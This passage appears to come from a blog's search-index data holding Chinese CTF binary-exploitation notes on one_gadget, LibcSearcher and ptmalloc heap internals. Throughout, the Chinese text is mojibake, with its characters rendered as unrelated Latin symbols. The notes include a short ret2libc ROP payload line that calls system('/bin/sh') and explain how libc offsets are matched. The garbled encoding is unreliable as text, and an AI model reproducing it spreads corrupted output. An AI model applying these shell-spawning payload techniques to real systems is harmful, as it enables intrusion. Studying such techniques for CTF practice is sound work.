N=100ï¼Œé‚£ä¹ˆ p64(ret)*100 å°±éœ€è¦ 100 * 8 = 800 å­—èŠ‚ã€‚è¿™å·²ç»è¿œè¿œè¶…è¿‡äº† read å‡½æ•°èƒ½è¯»å–çš„æœ€å¤§ 0x100 (256) å­—èŠ‚ã€‚\none_gadgetå’ŒLibcSearcherone_gadget æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒç”¨äºåˆ†æ libc åº“æ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°å…¶ä¸­å¯ä»¥ç›´æ¥ç”¨äºè·å– shell çš„æŒ‡ä»¤åºåˆ—çš„åç§»é‡ã€‚\nä¸ä¼ ç»Ÿçš„ system(&quot;/bin/sh&quot;) æ–¹æ³•ç›¸æ¯”ï¼Œone_gadget é€šå¸¸æ›´ç®€æ´ï¼Œå› ä¸ºå®ƒåªéœ€è¦ä¸€ä¸ªåœ°å€å°±èƒ½è·å– shellï¼Œè€Œä¸éœ€è¦ pop_rdi gadgetã€&quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„åœ°å€å’Œ system å‡½æ•°çš„åœ°å€ã€‚ æ­¤å¤–ï¼Œone_gadget é€šå¸¸å¯¹ç¯å¢ƒï¼ˆåŒ…æ‹¬æ ˆå¯¹é½ï¼‰çš„è¦æ±‚æ›´å®½æ¾ã€‚\nç”¨æ³•å’Œshellcodeä¸€æ ·\næ‰¾åˆ°ä½ç½®å³å¯ibc\næŠŠæ³„éœ²å‡ºæ¥çš„å‡½æ•°åœ°å€åœ¨libcç½‘ç«™åŒ¹é…\n\nä¹‹åä¸‹è½½åŒ¹é…çš„çš„libcç‰ˆæœ¬\nç”¨å‘½ä»¤\none_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so\n\n\næ‰¾åˆ°åˆé€‚çš„åç§»é‡å³å¯ï¼ˆåœ°å€ä¸‹é¢æ˜¯å®ƒè¦æ»¡è¶³çš„æ¡ä»¶ï¼‰\nLibcSearcher åŒ¹é…çš„ç‰ˆæœ¬æ˜¯å®ƒè‡ªå·±æ•°æ®åº“ä¸­çš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯ä½ æœ¬åœ°è®¡ç®—æœºä¸Š /lib/x86_64-linux-gnu/libc.so.6 è¿™æ ·çš„æ–‡ä»¶ã€‚\nsystem=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)\n\næ˜¯ç”¨å®ƒLibcSearcheråŒ¹é…çš„ç‰ˆæœ¬ï¼Œè€Œone_gadgetæ˜¯ç”¨æˆ‘ä»¬åŒ¹é…ä¸‹è½½çš„libcæ–‡ä»¶å»å®é™…è®¡ç®—çš„ï¼Œæ›´å‡†ç¡®\nsystem(&quot;/bin/sh&quot;) çš„å¤±è´¥ï¼š\n\nsystem(&quot;/bin/sh&quot;) æ–¹æ³•éœ€è¦è®¡ç®— system å‡½æ•°çš„åœ°å€ (libc_base + libc.dump(&#39;system&#39;)) å’Œ &quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„åœ°å€ (libc_base + libc.dump(&#39;str_bin_sh&#39;))ã€‚\n\nå¦‚æœè¿™ç§æ–¹æ³•å¤±è´¥ï¼Œæœ€æ ¸å¿ƒçš„åŸå› æ˜¯ LibcSearcher ä¸ºä½ é€‰å®šçš„é‚£ä¸ª libc ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ libc6_2.23-0ubuntu10_amd64ï¼‰ï¼Œè™½ç„¶å…¶ puts åç§»å’Œ one_gadget çš„ç‰¹å®šåç§»ä¸è¿œç¨‹æœåŠ¡å™¨ç›¸ç¬¦ï¼Œä½†å…¶å†…éƒ¨è®°å½•çš„ system å‡½æ•°å’Œ &quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„ç›¸å¯¹åç§»é‡ï¼Œä¸è¿œç¨‹æœåŠ¡å™¨å®é™… libc ä¸­çš„è¿™ä¸¤ä¸ªåç§»é‡ä¸ä¸€è‡´**ã€‚\n\nlibc ç‰ˆæœ¬å·ï¼ˆå¦‚ 2.23ï¼‰å¯èƒ½ç›¸åŒï¼Œä½†ä¸åŒçš„å‘è¡Œç‰ˆæˆ–ç¼–è¯‘é€‰é¡¹ï¼ˆå¦‚ ubuntu10 vs ubuntu11ï¼Œæˆ–ä¸åŒçš„æ„å»ºæ—¥æœŸï¼‰ä¼šå¯¼è‡´å†…éƒ¨å‡½æ•°å’Œå­—ç¬¦ä¸²çš„å…·ä½“ç›¸å¯¹ä½ç½®å­˜åœ¨ç»†å¾®å·®å¼‚ã€‚å³ä½¿ puts å’ŒæŸä¸ª one_gadget çš„åç§»æ°å¥½ç›¸åŒï¼Œsystem æˆ– &quot;/bin/sh&quot; çš„åç§»å¯èƒ½å°±ä¸åŒäº†ã€‚\n\nå½“ä½ ç”¨é”™è¯¯çš„åç§»é‡è®¡ç®—å‡º system å’Œ &quot;/bin/sh&quot; çš„åœ°å€å¹¶å°è¯•è·³è½¬æ—¶ï¼Œç¨‹åºä¼šå› ä¸º RIP æŒ‡å‘æ— æ•ˆåœ°å€æˆ– system å‡½æ•°æ¥æ”¶åˆ°æ— æ•ˆå‚æ•°è€Œå´©æºƒï¼ˆdumped coreï¼‰ã€‚\n\n\n","categories":["exercise_pwn"],"tags":["PWN","one_gadget","æ ˆè¿ç§»"]},{"title":"heap","url":"/2025/08/24/heap/","content":"å †ç®¡ç†å™¨ptmallocç¨‹åºè¿è¡Œæ—¶å †æä¾›åŠ¨æ€åˆ†å¸ƒçš„å†…å­˜ï¼Œä»è€Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ï¼Œå †ç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿ï¼Œè¿™å’Œæ ˆæ˜¯ç›¸åçš„ï¼ˆæ ˆæ˜¯ç”±é«˜åœ°\nå€å‘ä½åœ°å€æ–¹å‘ç”Ÿé•¿ï¼‰\næ¯ä¸ªç³»ç»Ÿéƒ½æœ‰è‡ªå·±çš„å †ç®¡ç†å™¨ï¼Œä¸åŒå¹³å°çš„å †ç®¡ç†å™¨æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ¯”å¦‚Windowsã€Linuxã€Macçš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œç”¨æˆ·è¯·æ±‚å †å—å’Œé‡Šæ”¾å †å—çš„æµç¨‹ä¹Ÿä¸ä¸€æ ·ã€‚\nå †åˆ©ç”¨å°±æ˜¯é’ˆå¯¹å †ç®¡ç†å™¨çš„ä¸€ç§åˆ©ç”¨æ€è·¯ã€‚å®ƒå°±åƒæ˜¯ä¸­ä»‹ï¼Œä¸ºäº†é¿å…ç³»ç»Ÿä¸ç”¨æˆ·é¢‘ç¹äº¤äº’ï¼ˆå› ä¸ºå’Œæ“ä½œç³»ç»Ÿäº¤äº’éå¸¸è€—æ—¶ï¼‰ï¼Œå°±æœ‰äº†å †ç®¡ç†å™¨ã€‚å®é™…ä¸Šï¼Œç”¨æˆ·å¹³æ—¶ç”³è¯·ï¼ˆmallocï¼‰å’Œé‡Šæ”¾ï¼ˆfreeï¼‰å †å—çš„æ—¶å€™ï¼Œæ˜¯å’Œå †ç®¡ç†å™¨ç›´æ¥æ¥è§¦çš„ã€‚\nptmallocåŸºæœ¬åŠŸèƒ½ä¸»è¦è´Ÿè´£å®Œæˆç”¨æˆ·çš„ä¸¤ä¸ªéœ€æ±‚ï¼šmallocï¼ˆç”³è¯·å †å—ï¼‰å’Œfreeï¼ˆé‡Šæ”¾å †å—ï¼‰\nåœ¨ptmallocå †ç®¡ç†å™¨ä¸­ï¼Œå†…æ ¸ä¸€èˆ¬ä¼šé¢„å…ˆåˆ†é…ä¸€å—å¾ˆå¤§çš„è¿ç»­çš„å†…å­˜ï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ï¼Œåªæœ‰å½“å‡ºç°å †ç©ºé—´ä¸è¶³çš„æƒ…å†µæ—¶ï¼Œptmallocå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨ç”³è¯·å†…å­˜\né‡Šæ”¾å †å—çš„æ—¶å€™ä¹Ÿæ˜¯ä¸€æ ·ï¼Œptmallocå †ç®¡ç†å™¨éœ€è¦ç®¡ç†ç”¨æˆ·é‡Šæ”¾çš„å †å—ï¼Œä¼šé€šè¿‡ä¸€ç³»åˆ—çš„binè¿›è¡Œç®¡ã€‚binåœ¨ptmallocä¸­ç”¨æ¥ä¿å­˜æ²¡æœ‰ä½¿ç”¨çš„chunkï¼ˆé‡Šæ”¾ä¹‹åçš„chunkï¼‰ã€‚æ ¹æ®éœ€æ±‚çš„ä¸åŒï¼Œbinåœ¨æ•°æ®ç»“æ„ä¸Šè¡¨ç°ä¸ºå•å‘é“¾è¡¨æˆ–è€…åŒå‘å¾ªç¯é“¾è¡¨ã€‚è€Œä¸”ç”¨æˆ·è¯·æ±‚å †å—çš„æ—¶å€™ä¼šä¼˜å…ˆæ¥è‡ªè¿™äº›é‡Šæ”¾çš„å †å—\nmallocå’Œfreemalloc\nç©ºé—´ä¸å¤Ÿ &gt;è¿”å›null\nå‚æ•°ä¸º0  &gt;è¿”å›ä¸€ä¸ªæœ€å°çš„chunk\nå‚æ•°ä¸ºè´Ÿ&gt;ç”³è¯·æœ‰ä¸ªå¾ˆå¤§çš„ç©ºé—´ï¼ˆä¸€èˆ¬ä¸ä¼šæˆåŠŸï¼Œä¼šè¿”å›nullï¼‰\nfree\nå‚æ•°ä¸ºnull&gt; æ— å½±å“\nå‚æ•°æŒ‡å‘çš„åœ°æ–¹å·²ç»è¢«é‡Šæ”¾æ—¶&gt; é™¤éè¢«ç¦ç”¨ï¼ˆä½¿ç”¨ malloptï¼‰ï¼Œå¦åˆ™å½“é‡Šæ”¾éå¸¸å¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œå°†å°½å¯èƒ½è‡ªåŠ¨è§¦å‘å°†æœªä½¿ç”¨çš„å†…å­˜è¿”è¿˜ç»™ç³»ç»Ÿçš„æ“ä½œï¼Œä»è€Œå‡å°ç¨‹åºå ç”¨ã€‚\nå†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨ptmallocé€šè¿‡brk&#x2F;sbrkå’Œmmap&#x2F;munmapè¿™ä¸¤ç»„ç³»ç»Ÿè°ƒç”¨å®ç°äº¤äº’\n\nbrk&#x2F;sbrk\nå¯¹äºå †çš„æ“ä½œï¼ŒLinuxæ“ä½œç³»ç»Ÿæä¾›äº†brkå‡½æ•°ï¼Œglibcåº“æä¾›äº†sbrkå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ brkçš„å¤§å°æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ã€‚\nåˆå§‹æ—¶ï¼Œå †çš„èµ·å§‹åœ°å€start_brkä»¥åŠå †çš„å½“å‰æœ«å°¾brkæŒ‡å‘åŒä¸€åœ°å€ã€‚\nä¸å¼€å¯ASLRä¿æŠ¤æ—¶ï¼Œstart_brkå’Œbrkä¼šæŒ‡å‘data&#x2F;bssæ®µçš„ç»“å°¾ã€‚\nå¼€å¯ASLRä¿æŠ¤æ—¶ï¼Œstart_brkå’Œbrkä¹Ÿä¼šæŒ‡å‘åŒä¸€ä½ç½®ï¼Œå³åœ¨data&#x2F;bssæ®µç»“å°¾åçš„éšæœºåç§»å¤„ã€‚\nç°ä»£æ“ä½œç³»ç»Ÿæ¯æ¬¡é‡å¯æ—¶éƒ½ä¼šå¼€å¯ASLRï¼Œæ‰€ä»¥å †çš„èµ·å§‹åœ°å€ä¹Ÿæ˜¯éšæœºçš„\nbrk():  brk() å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå³æ–°çš„ brk æŒ‡é’ˆçš„ ç»å¯¹åœ°å€ã€‚\nå¯ä»¥å°† brk æŒ‡é’ˆè®¾ç½®åˆ°ä»»ä½•ä½ æƒ³è¦çš„åˆæ³•ä½ç½®ï¼Œé€šå¸¸æ˜¯å‘ä¸Šç§»åŠ¨ä»¥ç”³è¯·æ›´å¤šå†…å­˜ã€‚\nå®ƒçš„è¿”å›å€¼ä¸º 0 è¡¨ç¤ºæˆåŠŸï¼Œ-1 è¡¨ç¤ºå¤±è´¥ã€‚\nè¿™ä¸ªå‡½æ•°æä¾›çš„æ˜¯ è®¾ç½® åŠŸèƒ½ã€‚\nsbrk(): * sbrk() å‡½æ•°æ¥å—ä¸€ä¸ª å¢é‡ å‚æ•°ï¼ˆincrementï¼‰ã€‚\nå®ƒå°†å½“å‰çš„ brk æŒ‡é’ˆ å‘å‰æˆ–å‘åç§»åŠ¨ æŒ‡å®šçš„å­—èŠ‚æ•°ã€‚\nå®ƒè¿”å›ç§»åŠ¨å‰çš„ brk æŒ‡é’ˆçš„åœ°å€ã€‚å¦‚æœè¿”å› (void*)-1ï¼Œåˆ™è¡¨ç¤ºå¤±è´¥ã€‚\nè¿™ä¸ªå‡½æ•°æä¾›çš„æ˜¯ å¢é‡ åŠŸèƒ½ã€‚\nå½“ä½¿ç”¨ brk() æˆ– sbrk() ç”³è¯·å†…å­˜æ—¶ï¼Œå®é™…ä¸Šæ˜¯ç§»åŠ¨äº†æ•°æ®æ®µçš„æœ«å°¾ï¼ˆbrk æŒ‡é’ˆï¼‰ï¼Œä»è€Œè·å¾—æ›´å¤§çš„å †ç©ºé—´ã€‚\nmmap&#x2F;munmap\nmallocä¼šä½¿ç”¨mmapæ¥æ˜ å°„æ•°æ®æ®µï¼Œå†…æ ¸ä¼šä¸ºä½ åˆ†é…ä¸€å—ç‰©ç†å†…å­˜ï¼Œå¹¶å°†å…¶å†…å®¹åˆå§‹åŒ–ä¸º 0ï¼Œä¸”mmap é»˜è®¤åˆ›å»ºçš„æ˜¯ç§æœ‰æ˜ å°„ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œè¢«æ˜ å°„çš„å†…å­˜åŒºåŸŸå±äºè°ƒç”¨å®ƒçš„è¿›ç¨‹ï¼Œå³ä½¿è¿™ä¸ªåŒºåŸŸæ˜¯æ–‡ä»¶æ˜ å°„ï¼Œè¯¥è¿›ç¨‹å¯¹å®ƒçš„ä¿®æ”¹ä¹Ÿä¸ä¼šåæ˜ åˆ°åŸæ–‡ä»¶ä¸­ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°å…¶ä»–åŒæ ·æ˜ å°„äº†æ­¤æ–‡ä»¶çš„è¿›ç¨‹ã€‚\nmunmapä¸mmapå¯¹åº”ï¼Œå…¶ä½œç”¨æ˜¯é‡Šæ”¾ç”³è¯·çš„å†…å­˜\nå †ç›¸å…³çš„æ•°æ®ç»“æ„malloc_chunk_6malloc åˆ†é…çš„å†…å­˜è¢«ç§°ä¸º chunkï¼Œå®ƒä»¬åœ¨è¢«é‡Šæ”¾åä¸ä¼šç«‹å³å½’è¿˜ç»™ç³»ç»Ÿï¼Œè€Œæ˜¯è¿›å…¥ä»¥åŒå‘é“¾è¡¨å½¢å¼ç»„ç»‡çš„ bin*ä¸­ã€‚\nåœ¨malloc_chunkçš„å®šä¹‰ä¸­ï¼Œå…±æœ‰6ä¸ªå­—æ®µï¼Œå³prev_sizeã€sizeã€fdã€bkã€fd_nextsizeã€bk_nextsizeã€‚\nprev_sizeå’Œsizeæ˜¯ä¸¤ä¸ªsize_tå­—æ®µï¼Œè€Œfd&#x2F;bkã€fd_nextsize&#x2F;bk_nextsizeéƒ½æ˜¯æŒ‡é’ˆå­—æ®µï¼Œå®é™…ä¸Šè®°å½•äº†ä¸¤ä¸ªåŒå‘é“¾è¡¨ã€‚\n\nprev_sizeå­˜å‚¨å‰ä¸€ä¸ª chunk çš„å¤§å°\nåœ¨ malloc_chunkç»“æ„ä½“ä¸­ï¼Œprev_size å­—æ®µä½äº size&#96;å­—æ®µä¹‹å‰\nå½“å‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkæ˜¯ç©ºé—²çš„ï¼ˆfreeï¼‰ï¼š\nptmalloc åº“å¯ä»¥é€šè¿‡è¿™ä¸ªå€¼ï¼Œå¿«é€Ÿæ‰¾åˆ°å‰ä¸€ä¸ªç©ºé—² chunk çš„èµ·å§‹ä½ç½®ï¼Œä»è€Œå°†ä¸¤ä¸ªç©ºé—² chunk åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„ç©ºé—² chunkï¼Œé¿å…å†…å­˜ç¢ç‰‡\nå½“å‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkæ­£åœ¨ä½¿ç”¨ï¼ˆin useï¼‰ï¼š\nå‰ä¸€ä¸ª chunk çš„å°¾éƒ¨æ˜¯ç”¨æˆ·æ•°æ®\né‚£ä¹ˆï¼Œä½ å½“å‰ chunk çš„prev_size å­—æ®µï¼Œå…¶å®ä½äºå‰ä¸€ä¸ª chunk çš„ç”¨æˆ·æ•°æ®åŒºå†…éƒ¨ã€‚\næ­¤æ—¶ï¼Œptmalloc çŸ¥é“å‰ä¸€ä¸ª chunk æ˜¯è¢«å ç”¨çš„ï¼Œæ‰€ä»¥å®ƒä¸ä¼šå»è¯»å– prev_size è¿™ä¸ªå­—æ®µã€‚å› æ­¤ï¼Œè¿™ä¸ªå­—æ®µçš„ç©ºé—´å¯ä»¥è¢«å‰ä¸€ä¸ª chunk çš„ç”¨æˆ·æ•°æ®æ‰€å ç”¨ï¼ˆç©ºé—´å¤ç”¨ï¼‰\n\n\nsizeå­˜å‚¨ç€å½“å‰chunkçš„å¤§å°ï¼Œæ˜¯2ï¼ŠSIZE_SZçš„æ•´æ•°å€\nåœ¨32ä½çš„ç³»ç»Ÿä¸­sizeæ˜¯8çš„æ•´æ•°å€ï¼Œ64ä½ç³»ç»Ÿä¸­æ˜¯16çš„æ•´æ•°å€\nç”¨æˆ·ç¨‹åºç”³è¯·çš„å¤§å°éƒ½ä¼šå‘ä¸Šå–æ•´ï¼Œæ¯”å¦‚åœ¨32ä½ç¨‹åºä¸­ï¼Œç”¨æˆ·ç”³è¯·çš„å¤§å°ä¸º0x14ï¼Œé‚£ä¹ˆå‘ä¸Šå–æ•´åä¸º0x18ã€‚ä½†å®é™…ä¸Šï¼Œåœ¨åˆ†é…çš„æ—¶å€™ï¼Œå› ä¸ºç©ºé—´å¤ç”¨ï¼Œæ‰€ä»¥åˆ†é…0x14å­—èŠ‚çš„chunkçš„æ—¶å€™ï¼Œç»“æœä¼šå’Œé¢„æƒ³çš„ä¸ä¸€æ ·\næŠŠsizeä»¥äºŒè¿›åˆ¶å†™å‡ºæ¥ä¼šå‘ç°åä¸‰ä½éƒ½æ˜¯0ï¼Œæ‰€ä»¥å°†æœ€ä½çš„ä¸‰ä½ç”¨äºå­˜å‚¨ä¸‰ä¸ªæ ‡å¿—ä½ï¼Œåˆ†åˆ«æ˜¯A|M|Pï¼Œä»é«˜ä½åˆ°ä½ä½ï¼Œ\nå…¶å¯¹åº”çš„è§£é‡Šå¦‚ä¸‹ï¼š\nA (NON_MAIN_ARENA):\nptmalloc æ”¯æŒå¤šçº¿ç¨‹,æ¯ä¸ªçº¿ç¨‹å¯ä»¥æœ‰è‡ªå·±çš„å†…å­˜æ± ,è¿™è¢«ç§°ä¸º arena,æ ‡å¿—ä½è¡¨ç¤ºæ˜¯ä¸æ˜¯ä¸»arenaã€‚\nå¦‚æœ A æ˜¯ 1 &gt; è¿™ä¸ª chunk æ¥è‡ªä¸€ä¸ªéä¸» arena\nå¦‚æœ A æ˜¯ 0 &gt; è¿™ä¸ª chunk æ¥è‡ªä¸» arena\nM (IS_MMAPED):\nè¡¨ç¤ºå½“å‰ chunk æ˜¯é€šè¿‡ mmap åˆ†é…çš„ï¼Œè¿˜æ˜¯é€šè¿‡ brk ä»ä¸»å †ä¸­åˆ†é…çš„\nM æ˜¯ 1  &gt; è¿™ä¸ª chunké€šè¿‡ mmap ç³»ç»Ÿè°ƒç”¨è·å¾—çš„,å½“å®ƒè¢«é‡Šæ”¾æ—¶ï¼Œptmalloc ä¸ä¼šæŠŠå®ƒæ”¾å…¥ç©ºé—²é“¾è¡¨ï¼ˆbinï¼‰ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨ munmap å°†å…¶å½’è¿˜ç»™æ“ä½œç³»ç»Ÿ\nM æ˜¯ 0  &gt; è¿™ä¸ª chunkæ˜¯é€šè¿‡ brk() ä»ä¸»å †åˆ†é…çš„ ,å½“å®ƒè¢«é‡Šæ”¾æ—¶ï¼Œptmalloc ä¼šå°†å…¶æ”¾å…¥å¯¹åº”çš„ bin ä¸­\nP (PREV_INUSE):\nè¡¨ç¤ºå‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„ chunk æ˜¯å¦æ­£åœ¨ä½¿ç”¨ä¸­\n P æ˜¯ 1 &gt; è¯´æ˜å‰ä¸€ä¸ª chunk æ­£åœ¨è¢«å ç”¨ï¼Œptmalloc åœ¨é‡Šæ”¾å½“å‰ chunk æ—¶ï¼Œå°±ä¸éœ€è¦æ£€æŸ¥å’Œåˆå¹¶å‰ä¸€ä¸ª chunkã€‚\nP æ˜¯ 0 &gt; è¯´æ˜å‰ä¸€ä¸ª chunk æ˜¯ç©ºé—²çš„ã€‚ptmalloc åœ¨é‡Šæ”¾å½“å‰ chunk æ—¶ï¼Œä¼šå»æŸ¥çœ‹å‰ä¸€ä¸ª chunkï¼Œå¹¶å°è¯•å°†ä¸¤ä¸ªç©ºé—²çš„ chunk åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„å—ï¼Œä»è€Œé¿å…å†…å­˜ç¢ç‰‡\neg:\n0x71ï¼Œ0x71&#x3D;&#x3D;0x70|0b001ï¼Œè¡¨ç¤ºè¿™ä¸ªchunkçš„å¤§å°ä¸º0x70ï¼Œå¯¹åº”çš„ä¸‰ä¸ªæ ‡å¿—ä½ä¸ºï¼šA&#x3D;0ï¼ŒM&#x3D;0ï¼ŒP&#x3D;1ï¼Œå³è¿™ä¸ªchunkå±äºä¸»çº¿ç¨‹ï¼Œä¸æ˜¯ç”±mmapç³»ç»Ÿè°ƒç”¨åˆ†é…ï¼Œå‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkåœ¨ä½¿ç”¨ä¸­ã€‚\nâ‘0x105ï¼Œ0x105&#x3D;&#x3D;0x100|0b101ï¼Œè¡¨ç¤ºè¿™ä¸ªchunkçš„å¤§å°ä¸º0x100ï¼Œå¯¹åº”çš„ä¸‰ä¸ªæ ‡å¿—ä½ä¸ºï¼šA&#x3D;1ï¼ŒM&#x3D;0ï¼ŒP&#x3D;1ï¼Œå³è¿™ä¸ªchunkä¸å±äºä¸»çº¿ç¨‹ï¼Œç”±å…¶ä»–çº¿ç¨‹åˆ†é…ï¼Œä¸æ˜¯ç”±mmapç³»ç»Ÿè°ƒç”¨åˆ†é…ï¼Œå‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkåœ¨ä½¿ç”¨ä¸­ã€‚\næƒ³è±¡ä¸€ä¸‹ arena æ˜¯ä¸€ä¸ªå†…å­˜åˆ†é…çš„å·¥å‚ã€‚æ¯ä¸ªå·¥å‚éƒ½æœ‰è‡ªå·±çš„åŸææ–™ï¼ˆå †ç©ºé—´ï¼‰å’Œä¸€å¥—ç®¡ç†æµç¨‹ã€‚\nä¸» arenaï¼šæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸”åªæœ‰ä¸€ä¸ªä¸» arenaã€‚å®ƒä½¿ç”¨è¿›ç¨‹çš„ä¸»å †ï¼ˆmain heapï¼Œé€šè¿‡ brk() æ‰©å±•çš„æ•°æ®æ®µï¼‰ä½œä¸ºåŸææ–™ã€‚æ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥ä»ä¸» arena ç”³è¯·å†…å­˜ã€‚\néä¸» arenaï¼šåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶è¯·æ±‚å†…å­˜ï¼Œä¸ºäº†é¿å…é”ç«äº‰ï¼Œptmalloc ä¼šä¸ºæŸäº›çº¿ç¨‹åˆ›å»ºæ–°çš„ arenaã€‚è¿™äº›æ–°çš„ arena ä¸ä½¿ç”¨ä¸»å †ï¼Œè€Œæ˜¯é€šè¿‡ mmap() ä»æ“ä½œç³»ç»Ÿè·å–ç‹¬ç«‹çš„å †ç©ºé—´æ¥ä½œä¸ºè‡ªå·±çš„åŸææ–™ã€‚\nè®©æˆ‘ä»¬ç”¨ä¸€ä¸ªç®€åŒ–çš„æµç¨‹æ¥æè¿° chunk å’Œ arena çš„å…³ç³»:\nçº¿ç¨‹ A è°ƒç”¨ malloc() è¯·æ±‚ 100 å­—èŠ‚å†…å­˜ã€‚\nptmalloc æ£€æŸ¥çº¿ç¨‹ A æ˜¯å¦æœ‰è‡ªå·±çš„ arenaã€‚å¦‚æœè¿™æ˜¯ç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒä¼šä½¿ç”¨ä¸» arenaã€‚\nä¸» arena æ£€æŸ¥è‡ªå·±çš„ç©ºé—²é“¾è¡¨ï¼ˆbinï¼‰ã€‚å¦‚æœæ²¡æœ‰åˆé€‚çš„chunkï¼Œå®ƒä¼šé€šè¿‡ brk() æ‰©å±•è‡ªå·±çš„ä¸»å †ï¼Œç„¶åä»æ–°ç©ºé—´ä¸­åˆ‡å‡º 100 å­—èŠ‚çš„chunkï¼Œå¹¶è¿”å›ç»™çº¿ç¨‹ Aã€‚\nçº¿ç¨‹ B åŒæ—¶è°ƒç”¨ malloc() è¯·æ±‚ 200 å­—èŠ‚å†…å­˜ã€‚\nå¦‚æœæ­¤æ—¶ä¸» arena è¢«çº¿ç¨‹ A é”ä½ï¼Œptmalloc ä¼šä¸ºçº¿ç¨‹ B åˆ›å»ºä¸€ä¸ªæ–°çš„ arenaã€‚\nè¿™ä¸ªæ–° arena é€šè¿‡ mmap() è·å¾—è‡ªå·±çš„å †ç©ºé—´ã€‚ç„¶åä»è¿™å—æ–°ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ª 200 å­—èŠ‚çš„chunkï¼Œå¹¶è¿”å›ç»™çº¿ç¨‹ Bã€‚\næ€»è€Œè¨€ä¹‹ï¼Œarena å°±åƒä¸€ä¸ªç‹¬ç«‹çš„å†…å­˜ç®¡ç†å•å…ƒï¼Œå®ƒæ‹¥æœ‰å’Œç®¡ç†è‡ªå·±çš„å †ç©ºé—´ï¼Œå¹¶è´Ÿè´£åˆ†é…å’Œå›æ”¶ chunkã€‚chunk åˆ™æ˜¯ arena ç®¡ç†ä¸‹çš„æœ€å°å†…å­˜å•å…ƒã€‚\nfd&#x2F;bkï¼ˆforward&#x2F;backwardï¼‰å½“chunkå¤„äºåˆ†é…çŠ¶æ€ï¼ˆä½¿ç”¨çŠ¶æ€ï¼‰çš„æ—¶å€™ï¼Œä»fdè¿™ä¸ªå­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ï¼Œæ‰€ä»¥å¦‚æœç”¨æˆ·ç¨‹åºåˆ†é…çš„å †å—å¤§å°æ˜¯0x20ï¼Œé‚£ä¹ˆå®é™…çš„å¼€é”€æ˜¯0x20+0x10ï¼ˆ64ä½ç¨‹åºï¼‰ï¼Œå¤šä½™çš„0x10æ˜¯glibcä¸ºäº†ç»´æŠ¤æ‰€æœ‰çš„chunkè€Œäº§ç”Ÿçš„å¼€é”€ã€‚æ­¤æ—¶fd&#x2F;bkä¸ä½¿ç”¨ï¼Œç©ºé—´è¢«ç”¨æˆ·æ•°æ®å¤ç”¨\nå¦‚æœä¸€ä¸ªchunkå¤„äºæœªä½¿ç”¨çŠ¶æ€ï¼Œé‚£ä¹ˆfd&#x2F;bkå°±ä¼šè®°å½•ç›¸åº”çš„é“¾è¡¨ä¿¡æ¯ã€‚å½“ä¸€ä¸ª chunk è¢«é‡Šæ”¾åï¼Œptmalloc ä¼šå°†å®ƒæ”¾å…¥ç›¸åº”çš„ç©ºé—²é“¾è¡¨bin\nfd æŒ‡é’ˆä¼šæŒ‡å‘é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªç©ºé—² chunkï¼Œå…ˆè¿›å…¥é“¾è¡¨\nbk æŒ‡é’ˆä¼šæŒ‡å‘é“¾è¡¨ä¸­çš„ä¸Šä¸€ä¸ªç©ºé—² chunkï¼Œåè¿›å…¥é“¾è¡¨\nfd_nextsize&#x2F;bk_nextsizelarge_binä¸­å­˜å‚¨ç€ä¸åŒå¤§å°çš„chunk\nfd_nextsize (forward next size)ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªå°ºå¯¸æ›´å¤§çš„ç©ºé—² chunk\nbk_nextsize (backward next size)ï¼šæŒ‡å‘ä¸Šä¸€ä¸ªå°ºå¯¸æ›´å°çš„ç©ºé—² 